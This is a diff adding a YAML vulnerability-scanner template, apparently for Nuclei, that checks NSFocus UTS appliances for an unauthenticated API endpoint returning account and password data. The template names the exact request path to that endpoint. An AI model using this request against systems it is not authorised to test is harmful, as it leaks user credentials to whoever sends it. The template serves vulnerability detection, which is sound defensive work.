@@ -1,0 +1,33 @@
+id: nsfocus-uts-unauthorized-access
+info:
+  name: NSFocus UTS Password Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects unauthorized access and potential password leaks in NSFocus UTS systems by verifying JSON response containing account and password fields.
+  reference:
+    - https://blog.csdn.net/m0_48520508/article/details/108719150
+
+http:
+  - raw:
+      - |
+        GET /webapi/v1/system/accountmanage/account HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: word
+        part: body
+        words:
+          - "account"
+          - "password"
